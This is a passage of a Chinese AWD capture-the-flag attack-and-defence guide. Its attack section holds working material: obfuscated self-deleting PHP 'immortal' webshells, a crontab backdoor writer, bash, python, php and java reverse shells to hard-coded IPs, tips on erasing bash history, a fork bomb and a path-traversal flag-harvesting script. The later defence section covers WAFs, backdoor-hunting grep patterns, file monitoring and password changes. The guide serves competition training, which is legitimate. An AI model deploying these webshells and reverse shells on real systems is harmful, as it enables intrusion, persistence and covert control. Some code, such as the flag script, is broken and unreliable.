class=\"lang-php\">file_put_contents('.1ndex.php',base64_decode('PD9waHAgIAogICAgc2V0X3RpbWVfbGltaXQoMCk7ICAKICAgIGlnbm9yZV91c2VyX2Fib3J0KDEpOyAgCiAgICB1bmxpbmsoX19GSUxFX18pOyAgCiAgICB3aGlsZSgxKXsgIAogICAgICAgIGZpbGVfcHV0X2NvbnRlbnRzKCcubG5kZXgucGhwJywnPD9waHAgaWYobWQ1KCRfR0VUWyJwYXNzIl0pPT0iNTAxNjBjMmVjNGY0MGQ3M2Y5MDYxZjg5NjcxMjExNTciKXtAZXZhbCgkX1BPU1RbImNtZCJdKTt9ID8+Jyk7ICAKICAgICAgICBzbGVlcCgwKTsgIAogICAgfQo/Pg=='));\r\n</code></pre>\n<p>get：pass=ocean888@.cn</p>\n<p>post：cmd=system(“ls”);</p>\n<ul>\n<li>linux命令不死马</li>\n</ul>\n<pre><code class=\"lang-python\">while true;do echo '&lt;?php eval($_POST[\"x\"]);?&gt;' &gt; x.php;sleep 1;done\r\n</code></pre>\n<ul>\n<li>普通php不死马</li>\n</ul>\n<pre><code class=\"lang-php\">&lt;?php \r\nignore_user_abort(true);\r\nset_time_limit(0);\r\nunlink(__FILE__);\r\n$file = '.index.php';\r\n$code = '&lt;?php if(md5($_GET[\"pass\"])==\"b1d2442581854c7e769e8ad870b50acd\"){@eval($_REQUEST[a]);} ?&gt;';\r\nwhile (1){\r\n    file_put_contents($file,$code);\r\n    usleep(5);\r\n}\r\n?&gt;\r\n\r\n\r\n#密码 ocean888@.cn\r\n#文件名 .index.php  .DS_story\r\n\r\n&lt;?php\r\n    set_time_limit(0);\r\n    ignore_user_abort(1);\r\n    unlink(__FILE__);\r\n    //file_put_contents(__FILE__,'');\r\n    while(1){\r\n        file_put_contents('path/webshell.php','&lt;?php @eval($_POST[\"password\"]);?&gt;');\r\n    }\r\n?&gt;\r\n</code></pre>\n<p>密码复杂，生成文件隐藏 .DS_store(原 .DS_Store)</p>\n<ul>\n<li>\n<h4 id=\"h4-crontab-\">\n<a class=\"reference-link\" name=\"crontab%E5%86%99%E9%A9%AC\"></a>crontab写马</h4>\n</li>\n</ul>\n<pre><code class=\"lang-bash\">system('echo \"* * * * * echo \\\"&lt;?php  if(md5(\\\\\\\\\\\\\\\\\\$_POST[pass])==\\'50160c2ec4f40d73f9061f8967121157\\'){@eval(\\\\\\\\\\\\\\\\\\$_POST[1]);}  \\\" &gt; /var/www/html/.index.php\\n* * * * * chmod 777 /var/www/html/.index.php\" | crontab;whoami');\r\n</code></pre>\n<p>密码：ocean888@.cn</p>\n<p><code>crontab -u www-data CRON_FILE</code> 来指定用户运行指定的定时任务</p>\n<p>也可以使用cromtab直接在对方靶机上提交flag，隐蔽且狗</p>\n<p>推荐：nu1l的ctfer从0到1，里面介绍了一些隐蔽的手段</p>\n<h4 id=\"h4-bash-shell\">\n<a class=\"reference-link\" name=\"bash%E5%8F%8D%E5%BC%B9shell\"></a>bash反弹shell</h4>\n<p>nc反弹shell</p>\n<pre><code class=\"lang-bash\">bash -i &gt;&amp; /dev/tcp/10.243.32.32/9 0&gt;&amp;1\r\n本地 nc -l -p 8080\r\n</code></pre>\n<p><img class=\"alignnone size-full wp-image-245403 aligncenter\" alt=\"\" width=\"1135\" height=\"419\" data-original=\"https://p4.ssl.qhimg.com/t01c54a9b6fdf8ea8db.png\"></p>\n<p><img class=\"alignnone size-full wp-image-245405 aligncenter\" alt=\"\" width=\"1041\" height=\"512\" data-original=\"https://p1.ssl.qhimg.com/t0185d44e8c0aba596b.png\"></p>\n<p>可以切换到bash命令去执行，但是使用bash命令会生成bash_history</p>\n<h4 id=\"h4-python-shell\">\n<a class=\"reference-link\" name=\"python%E5%8F%8D%E5%BC%B9shell\"></a>python反弹shell</h4>\n<pre><code>python -c \"import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.99.242',1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);\"\r\n</code></pre>\n<h4 id=\"h4-php-shell\">\n<a class=\"reference-link\" name=\"php%E5%8F%8D%E5%BC%B9shell\"></a>php反弹shell</h4>\n<pre><code class=\"lang-php\">php -r '$sock=fsockopen(\"10.243.32.53\",9999);exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'\r\n</code></pre>\n<p>此条命令将会返回一个和靶机相同的用户权限，使用php脚本反弹shell一般是www-data权限</p>\n<p><img class=\"alignnone size-full wp-image-245406 aligncenter\" alt=\"\" width=\"1059\" height=\"184\" data-original=\"https://p2.ssl.qhimg.com/t01ed58560cfd5efff4.png\"></p>\n<p><img class=\"alignnone size-full wp-image-245407 aligncenter\" alt=\"\" width=\"1106\" height=\"301\" data-original=\"https://p4.ssl.qhimg.com/t0133a1827d6b90f776.png\"></p>\n<p>建议连着kill两次</p>\n<h4 id=\"h4-java-shell\">\n<a class=\"reference-link\" name=\"java%E5%8F%8D%E5%BC%B9shell\"></a>java反弹shell</h4>\n<pre><code class=\"lang-java\">public class Revs {\r\n    /**\r\n    * @param args\r\n    * @throws Exception \r\n    */\r\npublic static void main(String[] args) throws Exception {\r\n        // TODO Auto-generated method stub\r\n        Runtime r = Runtime.getRuntime();\r\n        String cmd[]= {\"/bin/bash\",\"-c\",\"exec 5&lt;&gt;/dev/tcp/192.168.99.242/1234;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done\"};\r\n        Process p = r.exec(cmd);\r\n        p.waitFor();\r\n    }\r\n}\r\n</code></pre>\n<p>保存为Revs.java文件，编译执行，成功反弹shell。</p>\n<p>javac Revs.java<br>\njava Revs</p>\n<h4 id=\"h4--bash_history\">\n<a class=\"reference-link\" name=\"%E6%B8%85%E9%99%A4bash_history\"></a>清除bash_history</h4>\n<p>使用bash命令，会在root目录生成名为~/.bash_history的历史记录文件，建议清除记录，隐藏行踪</p>\n<h3 name=\"h3-10\" id=\"h3-10\">\n<a class=\"reference-link\" name=\"%E6%89%B9%E9%87%8F%E8%84%9A%E6%9C%AC\"></a>批量脚本</h3>\n<h4 id=\"h4--flag\">\n<a class=\"reference-link\" name=\"%E6%89%B9%E9%87%8F%E4%BA%A4flag\"></a>批量交flag</h4>\n<p>有的比赛会提前说提交flag的方法，这样我们就可以提前写好脚本，找到漏洞小改一下就能用了</p>\n<p><img class=\"alignnone size-full wp-image-245409 aligncenter\" alt=\"\" width=\"692\" height=\"258\" data-original=\"https://p0.ssl.qhimg.com/t016b0ef4c88c600349.png\"></p>\n<p>假设有文件读取的话，就可以批量获取并提交flag</p>\n<pre><code class=\"lang-python\">import requests\r\ndef getFlag(ip, port, dir)\r\n    fullUrl = \"http://\" + ip + \":\" + port + url\r\n    res = requests.get(url = fullUrl)\r\n    return res.text\r\n\r\ndef subFlag(r_time, ip, port, dir, token):\r\n    #Set submit flag url\r\n    f_url = 'http://10.10.10.10/api/v1/att_def/web/submit_flag/?event_id=21'\r\n    #Set token\r\n    while True:\r\n        for q in ip:\r\n            # q是单个ip，port是端口，shell为初始后门的地址，passwd为初始后门的密码\r\n            flag_tmp = get_flag(ip, port, dir)\r\n            s_f_pay = {\r\n                'flag':flag_tmp,\r\n                'token':token\r\n            }\r\n\r\n            # r = requests.post(url,headers=headers,data = json.dumps(data))\r\n            r = requests.post(f_url, data = s_f_pay)\r\n            print(r.text)\r\n        time.sleep(r_time * 60)\r\n\r\nif __name__ == '__main__' :\r\n    # 这个可以看请况写个循环，遍历出所有ip\r\n    subFlag(10, 172.35.19.11, 80, \"/statics/1.php?file=../../../../../../flag\", \"FUPDSjgifpoejsiJIFPjipojfdsa\")\r\n</code></pre>\n<h4 id=\"h4-brup-\">\n<a class=\"reference-link\" name=\"brup%E6%8F%92%E4%BB%B6\"></a>brup插件</h4>\n<p>使用burp提供的burp-requests插件更快的写出poc，安装方法可以百度下，和其他的插件安装方法一致</p>\n<p>当找到漏洞利用方法时，可以抓取流量，burp界面空白处右击，选择copy as requests</p>\n<p><img class=\"alignnone size-full wp-image-245410 aligncenter\" alt=\"\" width=\"1053\" height=\"430\" data-original=\"https://p5.ssl.qhimg.com/t01349d3c5f8f85a3e0.png\"></p>\n<p>直接复制到python脚本里就可以</p>\n<p>效果如下</p>\n<p><img class=\"alignnone size-full wp-image-245411 aligncenter\" alt=\"\" width=\"1068\" height=\"159\" data-original=\"https://p0.ssl.qhimg.com/t01cfbd67f482ef1b7a.png\"></p>\n<h4 id=\"h4-aoiawd-\">\n<a class=\"reference-link\" name=\"Aoiawd%E6%89%B9%E9%87%8F\"></a>Aoiawd批量</h4>\n<p>Aoiawd是安恒实验室研发的一款awd神器，后面单独部分介绍</p>\n<p>使用Aoiawd的流量监测功能，一键生成poc，批量拿flag</p>\n<h4 id=\"h4-u6405u5C4E\">\n<a class=\"reference-link\" name=\"%E6%90%85%E5%B1%8E\"></a>搅屎</h4>\n<p>fork炸弹</p>\n<pre><code># 参考: https://linux.cn/article-5685-1-rss.html\r\n:(){:|:&amp;};:\r\n</code></pre>\n<p> </p>\n<h2 name=\"h2-11\" id=\"h2-11\">防御</h2>\n<p>防御主要包括三个监控：</p>\n<p>文件监控</p>\n<p>流量监控</p>\n<p>端口监控</p>\n<h3 name=\"h3-12\" id=\"h3-12\">\n<a class=\"reference-link\" name=\"%E5%AE%9E%E7%94%A8%E5%91%BD%E4%BB%A4\"></a>实用命令</h3>\n<ul>\n<li>查找可能的password\n<pre><code>cd /var/www/html\r\nfind .|xargs grep \"password\"\r\n</code></pre>\n</li>\n<li>查找后门\n<pre><code>find /var/www/html -name \"*.php\" |xargs egrep 'assert|eval|phpinfo\\(\\)|\\(base64_decoolcode|shell_exec|passthru|file_put_contents\\(\\.\\*\\$|base64_decode\\('\r\n</code></pre>\n</li>\n<li>查找flag的位置\n<pre><code>使用 `find / -name *flag*` 或 `grep -rn \"flag\" *` 类似的语句可以快速发现 flag 所在的地方，方便后续拿分\r\n</code></pre>\n</li>\n<li>备份网站源码和数据库\n<ol>\n<li>mobaxterm直接拖</li>\n</ol>\n<p>​ 备份数据库在dump源码部分有</p>\n<ol>\n<li>linux命令进行备份</li>\n</ol>\n<pre><code class=\"lang-bash\">scp -r -P Port remote_username<a class=\"at-link\" title=\"@remote_ip\" href=\"https://github.com/remote_ip\">@remote_ip</a>:remote_folder local_file\r\n</code></pre>\n</li>\n<li>检查有没有多余无用端口对外开放\n<pre><code class=\"lang-bash\">netstat -anptl\r\n</code></pre>\n</li>\n</ul>\n<h3 name=\"h3-13\" id=\"h3-13\">\n<a class=\"reference-link\" name=\"%E9%83%A8%E7%BD%B2waf\"></a>部署waf</h3>\n<p>waf部署需要谨慎，分为两种情况：无check机制、部分检查不允许上通防waf，有些比赛上通防可能会扣掉很多分实在不划算</p>\n<p>还需要注意的是：上完waf检查服务是否可用</p>\n<h4 id=\"h4--check-\">\n<a class=\"reference-link\" name=\"%E6%97%A0check%E6%9C%BA%E5%88%B6\"></a>无check机制</h4>\n<p>估计无check机制的比赛也没啥可玩性了，推荐watch bird和aoiawd，直接防护全开，替换flag，流量转发完事儿，或者有的连页面都不check的直接删站看他咋拿flag</p>\n<h4 id=\"h4-u90E8u5206u68C0u67E5\">\n<a class=\"reference-link\" name=\"%E9%83%A8%E5%88%86%E6%A3%80%E6%9F%A5\"></a>部分检查</h4>\n<p>部分检查允许使用部分小的waf，会检查页面完整性、服务完整性</p>\n<p>直接github找一些waf即可，一下介绍一些waf部署方法</p>\n<p><strong>有root权限</strong></p>\n<p>1.</p>\n<pre><code class=\"lang-bash\">#每个文件前边加 require_once(waf.php);\r\nfind /var/www/html -type f -path \"*.php\" | xargs sed -i \"s/&lt;?php/&lt;?phpnrequire_once('./log.php');n/g\"\r\n\r\nfind /var/www/html -type f -path \"*.php\" | xargs sed -i \"s/&lt;?php/&lt;?php include_once(\\\"\\/var\\/www\\/html\\/waf.php\\\");/g\"\r\n\r\n上waf：\r\n$ find . -path ./waffffff -prune -o -type f -name \"*.php\" -print | xargs sed -i \"s/&lt;?php/&lt;?php include_once(\\\"\\/var\\/www\\/html\\/waffffff\\/waf.php\\\");/g\"\r\n\r\n下waf：\r\n$ find . -path ./waffffff -prune -o -type f -name \"*.php\" -print | xargs sed -i \"s/&lt;?php include_once(\\\"\\/var\\/www\\/html\\/waffffff\\/waf.php\\\");/&lt;?php/g\"\r\n</code></pre>\n<p>2.</p>\n<pre><code class=\"lang-bash\">vim php.ini\r\n\r\nauto_append_file = \"/dir/path/phpwaf.php\"\r\n\r\n重启Apache或者php-fpm就能生效了。\r\n</code></pre>\n<p>3.</p>\n<pre><code class=\"lang-bash\">改 .user.ini配置文件 auto_prepend_file=&lt;filename&gt;;  包含在文件头\r\n\r\nauto_append_file=&lt;filename&gt;;  包含在文件尾\r\nphp_value auto_prepend_file \"/dir/path/phpwaf.php\"\r\n</code></pre>\n<p>注：如果挂了waf出现持续扣分，waf去掉</p>\n<p><strong>只有user权限</strong></p>\n<p>没写系统权限就只能在代码上面下手了，也就是文件包含。</p>\n<p>这钟情况又可以用不同的方式包含。</p>\n<p>1.</p>\n<p>如果是框架型应用，那麽就可以添加在入口文件，例如index.php，</p>\n<p>如果不是框架应用，可以在公共配置文件config.php等相关文件中包含。</p>\n<pre><code class=\"lang-bash\">include('phpwaf.php');\r\n</code></pre>\n<p>2.</p>\n<p>替换index.php，也就是将index.php改名为index2.php，然后讲phpwaf.php改成index.php。</p>\n<p>当然还没完，还要在原phpwaf.php中包含原来的index.php</p>\n<pre><code class=\"lang-bash\">index.php -&gt; index2.php\r\nphpwaf.php -&gt;index.php\r\ninclude('index2.php');\r\n</code></pre>\n<ul>\n<li>修改权限mysqll用户读表权限上传目录是否可执行的权限</li>\n<li>部署文件监控脚本php.ini\n<pre><code>auto_prepend_file = waf.php的路径;\r\n</code></pre>\n<pre><code>require_once('waf.php');\r\n\r\n常用cms添加waf位置\r\nPHPCMS V9 \\phpcms\\base.php\r\nPHPWIND8.7 \\data\\sql_config.php\r\nDEDECMS5.7 \\data\\common.inc.php\r\nDiscuzX2   \\config\\config_global.php\r\nWordpress   \\wp-config.php\r\nMetinfo   \\include\\head.php\r\n</code></pre>\n</li>\n</ul>\n<h4 id=\"h4-u5B8Cu5168u68C0u67E5\">\n<a class=\"reference-link\" name=\"%E5%AE%8C%E5%85%A8%E6%A3%80%E6%9F%A5\"></a>完全检查</h4>\n<p>完全检查大多出现在awd pwn中，比如不允许对漏洞函数进行修改</p>\n<h3 name=\"h3-14\" id=\"h3-14\">\n<a class=\"reference-link\" name=\"%E5%85%8B%E5%88%B6%E4%B8%8D%E6%AD%BB%E9%A9%AC\"></a>克制不死马</h3>\n<ol>\n<li>强行kill掉进程后重启服务（不建议）\n<pre><code class=\"lang-bash\">ps -aux|grep ‘www-data’|awk ‘{print $2}’|xargs kill -9\r\n</code></pre>\n</li>\n<li>建立一个和不死马相同名字的文件或者目录，sleep短于不死马</li>\n<li>写脚本不断删除</li>\n</ol>\n<h3 name=\"h3-15\" id=\"h3-15\">\n<a class=\"reference-link\" name=\"%E5%B9%B2%E6%8E%89%E5%8F%8D%E5%BC%B9shell\"></a>干掉反弹shell</h3>\n<p>ps -ef / px -aux</p>\n<p>出现www-data权限的/bin/sh一般为nc</p>\n<p><img class=\"alignnone size-full wp-image-245412 aligncenter\" alt=\"\" width=\"1133\" height=\"51\" data-original=\"https://p1.ssl.qhimg.com/t01bad1fe97c1b010b9.png\"></p>\n<p>如果有一些进程杀不掉可以尝试www-data权限去杀</p>\n<p>kill.php</p>\n<pre><code class=\"lang-php\">&lt;?php\r\nsystem(\"kill `ps -aux | grep www-data | grep apache2 | awk '{print $2}'`\");\r\n?&gt;\r\n</code></pre>\n<p>从浏览器访问，就是www-data权限</p>\n<p>建议连着kill两次</p>\n<h3 name=\"h3-16\" id=\"h3-16\">\n<a class=\"reference-link\" name=\"%E6%94%B9%E5%AF%86%E7%A0%81\"></a>改密码</h3>\n<p>如果有弱口令，拿到密码后先更改，然后用默认密码去批量登录其他的主机</p>\n<h4 id=\"h4-ssh-\">\n<a class=\"reference-link\" name=\"ssh%E5%AF%86%E7%A0%81\"></a>ssh密码</h4>\n<p>ssh密码就是本机密码</p>\n<p>passwd命令改密码</p>\n<h4 id=\"h4-phpmyadmin\">\n<a class=\"reference-link\" name=\"phpmyadmin\"></a>phpmyadmin</h4>\n<p>phpmyadmin的密码就是数据库的密码，直接改mysql密码</p>\n<p><img class=\"alignnone size-full wp-image-245413 aligncenter\" alt=\"\" width=\"671\" height=\"403\" data-original=\"https://p5.ssl.qhimg.com/t012dd1a4d7f7749a1b.png\"></p>\n<p><img class=\"alignnone size-full wp-image-245414 aligncenter\" alt=\"\" width=\"1185\" height=\"762\" data-original=\"https://p2.ssl.qhimg.com/t018d05ba809bd86e00.png\"></p>\n<p>更改密码直接点执行就行，不要点生成（会随机生成新的密码）</p>\n<h4 id=\"h4-mysql\">\n<a class=\"reference-link\" name=\"mysql\"></a>mysql</h4>\n<p>修改mysql登录密码</p>\n<p>方法一：</p>\n<p>mysql&gt;set password for root<a class=\"at-link\" title=\"@localhost\" href=\"https://github.com/localhost\">@localhost</a> =password(‘ocean888’);</p>\n<p>config.php文件中是有数据库的连接信息，执行完上条命令后<strong>更改</strong>此文件</p>\n<p>方法二：</p>\n<p>mysqladmin -uroot -p 123456 password 123</p>\n<p>root=用户名； 123456=旧密码； 123=新密码；</p>\n<h4 id=\"h4-u540Eu53F0u5BC6u7801\">\n<a class=\"reference-link\" name=\"%E5%90%8E%E5%8F%B0%E5%AF%86%E7%A0%81\"></a>后台密码</h4>\n<p>修改后台登录密码</p>\n<p>mysql -u root -p</p>\n<p>show databases；</p>\n<p>use test;</p>\n<p>show tables;</p>\n<p>select * from admin;</p>\n<p>updata admin set user pass=’123456’; //updata 表名 set 字段名 = ‘值’;</p>\n<p>flush privileges;</p>\n<h3 name=\"h3-17\" id=\"h3-17\">\n<a class=\"reference-link\" name=\"%E6%96%87%E4%BB%B6%E7%9B%91%E6%8E%A7\"></a>文件监控</h3>\n<h4 id=\"h4--python-\">\n<a class=\"reference-link\" name=\"%E6%9C%AC%E5%9C%B0%E6%9C%89python%E7%8E%AF%E5%A2%83\"></a>本地有python环境</h4>\n<p>如果有python环境，py文件监控脚本一搜一大堆。。。</p>\n<p>贴一个这个师傅写的：<a href=\"https://www.shuzhiduo.com/A/GBJrKlDG50/\">https://www.shuzhiduo.com/A/GBJrKlDG50/</a></p>\n<h4 id=\"h4--python-\">\n<a class=\"reference-link\" name=\"%E6%9C%AC%E5%9C%B0%E6%B2%A1%E6%9C%89python%E7%8E%AF%E5%A2%83\"></a>本地没有python环境</h4>\n<p>可以使用ssh远程去连接靶机进行监控</p>\n<ul>\n<li>vscode‐&gt;ssh插件或者是phpstorm，实时在线编辑</li>\n</ul>\n<p>监听还原脚本‐&gt;5分钟还原一次</p>\n<p>使用本地py环境运行，需要更改sshIP及端口</p>\n<pre><code class=\"lang-python\"># -*- encoding: utf-8 -*-\r\n'''\r\n监听还原脚本‐&gt;5分钟还原一次\r\n@File    :   awd.py\r\n@Time    :   2020/08/09 20:44:54\r\n@Author  :   iloveflag \r\n@Version :   1.0\r\n@Contact :   iloveflag@outlook.com\r\n@Desc    :  The Win32 port can only create tar archives,\r\n            but cannot pipe its output to other programs such as gzip or compress, \r\n            and will not create tar.gz archives; you will have to use or simulate a batch pipe.\r\n            BsdTar does have the ability to direcly create and manipulate .tar, .tar.gz, tar.bz2, .zip,\r\n            .gz and .bz2 archives, understands the most-used options of GNU Tar, and is also much faster;\r\n            for most purposes it is to be preferred to GNU Tar. \r\n'''\r\n\r\nimport paramiko\r\nimport os\r\nimport time\r\n\r\ndef web_server_command(command,transport): #对服务器执行命令\r\n    ssh = paramiko.SSHClient()\r\n    ssh._transport = transport\r\n    stdin, stdout, stderr = ssh.exec_command(command)\r\n    # print(stdout.read())\r\n\r\n\r\ndef web_server_file_action(ip, port, user, passwd, action): #对服务器文件操作\r\n    try:\r\n        transport = paramiko.Transport(ip, int(port))\r\n        transport.connect(username=user, password=passwd)\r\n        sftp = paramiko.SFTP.from_transport(transport)\r\n        remote_path='/var/www/html/'\r\n        remote_file = 'html.tar'\r\n        local_path = 'C:/Users/'+os.getlogin()+'/Desktop/awd/'+ip+'/'\r\n        web_server_command('cd '+remote_path+' &amp;&amp; tar -cvf '+remote_file+' ./',transport)\r\n        if not(os.path.exists(local_path)):\r\n            os.makedirs(local_path)\r\n        if action == 'get':\r\n            sftp.get(remote_path+remote_file,local_path+remote_file)\r\n            web_server_command('rm -rf '+remote_path+remote_file,transport)\r\n            print('服务器源码保存在'+local_path)\r\n            print('正在解压:')\r\n            os.system('cd '+local_path+' &amp; tar -xvf '+remote_file+' &amp;del '+remote_file)\r\n            print('文件解压完成')\r\n        else:\r\n            web_server_command('rm -rf '+remote_path+'*',transport)\r\n            print('清理服务器web目录')\r\n            os.system('cd '+local_path+' &amp; tar -cvf '+remote_file+' ./*')\r\n            sftp.put(local_path+remote_file, remote_path+remote_file)\r\n            print('上传成功')\r\n            web_server_command('cd '+remote_path+'&amp;&amp; tar -xvf '+remote_file+' &amp;&amp; rm -rf '+remote_file,transport)\r\n            print('还原完毕')\r\n            print('-----------------------------')\r\n        sftp.close()\r\n    except:\r\n        pass\r\n        print('download or upload error')\r\n\r\n\r\ndef web_server_mysql_action():\r\n    #web_server_mysql_action\r\n    pass\r\ndef web_server_status():\r\n    #web_server_status\r\n    pass\r\nif __name__ == '__main__':\r\n    web1_server_ip='10.241.180.159'\r\n    web1_server_port='30021'\r\n    web1_server_user='ctf'\r\n    web1_server_passwd='123456'\r\n    while(1):       \r\n        for i in range(5,0,-1):\r\n            time.sleep(1)\r\n            print('倒计时'+str(i)+'秒')\r\n        web_server_file_action(web1_server_ip,web1_server_port,web1_server_user,web1_server_passwd, 'put')\r\n</code></pre>\n<h4 id=\"h4-scp-\">\n<a class=\"reference-link\" name=\"scp%E5%91%BD%E4%BB%A4\"></a>scp命令</h4>\n<pre><code class=\"lang-bash\">scp -P 30022 -r -q web ctf@10.241.180.159:/var/www/html\r\n\r\n# 按照提示输入密码即可\r\nscp [可选参数] file_source file_target \r\n-P 指定传输到服务器的端口，默认为22\r\n-r 递归传输整个web文件夹\r\n-q 不显示传输进度条\r\n</code></pre>\n<p><img class=\"alignnone size-full wp-image-245415 aligncenter\" alt=\"\" width=\"1172\" height=\"64\" data-original=\"https://p0.ssl.qhimg.com/t01d3d69427cc2d5613.png\"></p>\n<h3 name=\"h3-18\" id=\"h3-18\">\n<a class=\"reference-link\" name=\"%E5%B8%B8%E7%94%A8linux%E5%91%BD%E4%BB%A4\"></a>常用linux命令</h3>\n<pre><code class=\"lang-bash\">ssh &lt;-p 端口&gt; 用户名@IP　　\r\nscp 文件路径  用户名@IP:存放路径　　　　\r\ntar -zcvf web.tar.gz /var/www/html/　　\r\nw 　　　　\r\npkill -kill -t &lt;用户tty&gt;　　 　　\r\nps aux | grep pid或者进程名　\r\n\r\n#查看已建立的网络连接及进程\r\nnetstat -antulp | grep EST\r\n\r\n#查看指定端口被哪个进程占用\r\nlsof -i:端口号 或者 netstat -tunlp|grep 端口号\r\n\r\n#结束进程命令\r\nkill PID\r\nkillall &lt;进程名&gt;　　\r\nkill - &lt;PID&gt;　　\r\n\r\n#封杀某个IP或者ip段，如：.　　\r\niptables -I INPUT -s . -j DROP\r\niptables -I INPUT -s ./ -j DROP\r\n\r\n#禁止从某个主机ssh远程访问登陆到本机，如123..　　\r\niptable -t filter -A INPUT -s . -p tcp --dport  -j DROP\r\n\r\n#检测所有的tcp连接数量及状态\r\nnetstat -ant|awk  |grep |sed -e  -e |sort|uniq -c|sort -rn\r\n\r\n#查看页面访问排名前十的IP\r\ncat /var/log/apache2/access.log | cut -f1 -d   | sort | uniq -c | sort -k  -r | head -　　\r\n\r\n#查看页面访问排名前十的URL\r\ncat /var/log/apache2/access.log | cut -f4 -d   | sort | uniq -c | sort -k  -r | head -\r\n</code></pre>\n<ul>\n<li>如果有root权限可以用chattr命令防止系统中某个关键文件被修改chattr +i /etc/resolv.conf如果想进行修改，必须用命令”chattr -i”取消隐藏属性</li>\n<li>ls -t 按修改时间来看最新被修改的文件</li>\n</ul>\n<h3 name=\"h3-19\" id=\"h3-19\">\n<a class=\"reference-link\" name=\"%E6%B5%81%E9%87%8F%E7%9B%91%E6%8E%A7\"></a>流量监控</h3>\n<p>流量监控也是可以使用aoiawd进行，aoiawd还是在后边，或者用别的脚本记录流量，有的比赛也会定时提供上阶段流量</p>\n<p>被上马一定要先备份到本地，再删除、去分析反打别人</p>\n<h4 id=\"h4-php-\">\n<a class=\"reference-link\" name=\"php%E6%B5%81%E9%87%8F%E7%9B%91%E6%8E%A7\"></a>php流量监控</h4>\n<pre><code class=\"lang-php\">&lt;?php\r\n\r\ndate_default_timezone_set('Asia/Shanghai');\r\n\r\n$ip = $_SERVER[\"REMOTE_ADDR\"]; //记录访问者的ip\r\n\r\n$filename = $_SERVER['PHP_SELF']; //访问者要访问的文件名\r\n\r\n$parameter = $_SERVER[\"QUERY_STRING\"]; //访问者要请求的参数\r\n\r\n$time = date('Y-m-d H:i:s',time()); //访问时间\r\n\r\n$logadd = '来访时间：'.$time.'--&gt;'.'访问链接：'.'http://'.$ip.$filename.'?'.$parameter.\"\\r\\n\";\r\n\r\n// log记录\r\n\r\n$fh = fopen(\"log.txt\", \"a\");\r\n\r\nfwrite($fh, $logadd);\r\n\r\nfclose($fh);\r\n\r\n?&gt;\r\n</code></pre>\n<h4 id=\"h4-weblogger\">\n<a class=\"reference-link\" name=\"weblogger\"></a>weblogger</h4>\n<p><a href=\"https://github.com/wupco/weblogger\">一个针对php的web流量抓取、分析的应用。</a></p>\n<p>使用方法</p>\n<pre><code>   cd /var/www/html/ (or other web dir)\r\n\r\n   git clone https://github.com/wupco/weblogger.git\r\n\r\n   chmod -R 777 weblogger/\r\n\r\n   open http://xxxxx/weblogger/install.php in Web browser\r\n\r\n   install it\r\n</code></pre>\n<h3 name=\"h3-20\" id=\"h3-20\">\n<a class=\"reference-link\" name=\"wireshark\"></a>wireshark</h3>\n<h4 id=\"h4--ip-\">\n<a class=\"reference-link\" name=\"%E8%BF%87%E6%BB%A4IP%E5%9C%B0%E5%9D%80\"></a>过滤IP地址</h4>\n<blockquote><p>(1) ip.addr == 192.168.1.1 //只显示源/目的IP为192.168.1.1的数据包 (2) not ip.src == 1.1.1.1 //不显示源IP为1.1.1.1的数据包 (3 ip.src == 1.1.1.1 or ip.dst == 1.1.1.2 //只显示源IP为1.1.1.1或目的IP为1.1.1.2的数据包</p></blockquote>\n<h4 id=\"h4-u8FC7u6EE4u7AEFu53E3\">\n<a class=\"reference-link\" name=\"%E8%BF%87%E6%BB%A4%E7%AB%AF%E5%8F%A3\"></a>过滤端口</h4>\n<blockquote><p>(1) tcp.port eq 80 #不管端口是来源还是目的都显示80端口 (2) tcp.port == 80 (3) tcp.port eq 2722 (4) tcp.port eq 80 or udp.port eq 80 (5) tcp.dstport == 80 #只显示tcp协议的目标端口80 (6) tcp.srcport == 80 #只显示tcp协议的来源端口80 (7) udp.port eq 15000 (8) tcp.port &gt;= 1 and tcp.port &lt;= 80 #过滤端口范围</p></blockquote>\n<h4 id=\"h4--mac-\">\n<a class=\"reference-link\" name=\"%E8%BF%87%E6%BB%A4MAC%E5%9C%B0%E5%9D%80\"></a>过滤MAC地址</h4>\n<blockquote><p>(1) eth.dst == MAC地址 #过滤目标MAC (2) eth.src eq MAC地址 #过滤来源MAC (3)eth.addr eq MAC地址 #过滤来源MAC和目标MAC都等于MAC地址的</p></blockquote>\n<h4 id=\"h4-http-\">\n<a class=\"reference-link\" name=\"http%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F%E8%BF%87%E6%BB%A4\"></a>http请求方式过滤</h4>\n<blockquote><p>(1) http.request.method == “GET” (2) http.request.method == “POST” (3) http.host mathes “www.baidu.com|<a href=\"https://link.zhihu.com/?target=http%3A//baidu.cn\">http://baidu.cn</a>“ #matches可以写多个域名 (4) http.host contains “<a href=\"https://link.zhihu.com/?target=http%3A//www.baidu.com\">http://www.baidu.com</a>“ #contain只能写一个域名 (5) http contains “GET” 例如： http.request.method ==”GET” &amp;&amp; http contains “Host: “ http.request.method == “GET” &amp;&amp; http contains “User-Agent: “ http.request.method ==”POST” &amp;&amp; http contains “Host: “ http.request.method == “POST” &amp;&amp; http contains “User-Agent: “ http contains “HTTP/1.1 200 OK” &amp;&amp; http contains “Content-Type: “ http contains “HTTP/1.0 200 OK” &amp;&amp; http contains “Content-Type: “</p></blockquote>\n<h4 id=\"h4-tcpdump-\">\n<a class=\"reference-link\" name=\"TCPdump%E5%88%86%E6%9E%90\"></a>TCPdump分析</h4>\n<blockquote><p>tcpdump采用命令行方式，它的命令格式为：tcpdump [-adeflnNOpqStvx0] [-c 数量] [-F 文件名] [-i 网络接口] [-r 文件名] [-s snaplen] [-T 类型] [-w 文件名] [表达式]</p></blockquote>\n<p>详细参数：</p>\n<p>抓包选项：|作用 —-|— -c：|指定要抓取的包数量。 -i interface：|指定tcpdump需要监听的接口。默认会抓取第一个网络接口 -n|：对地址以数字方式显式，否则显式为主机名，也就是说-n选项不做主机名解析。 -nn：|除了-n的作用外，还把端口显示为数值，否则显示端口服务名。 -P：|指定要抓取的包是流入还是流出的包。可以给定的值为”in”、”out”和”inout”，默认为”inout”。 -s 